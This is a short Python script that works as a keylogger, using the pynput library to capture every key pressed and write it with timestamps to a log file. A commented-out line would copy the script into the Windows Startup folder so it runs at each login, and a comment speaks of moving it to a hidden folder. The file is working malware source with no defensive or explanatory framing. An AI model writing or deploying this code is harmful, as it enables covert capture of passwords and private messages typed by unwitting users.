import logging
import os
from shutil import copyfile

from pynput.keyboard import Listener

username = os.getlogin()
# Moved to hidden folder
logging_dir = os.getcwd()

#copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

logging.basicConfig(filename=f'{logging_dir}/mylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def key_handler(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
        
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()
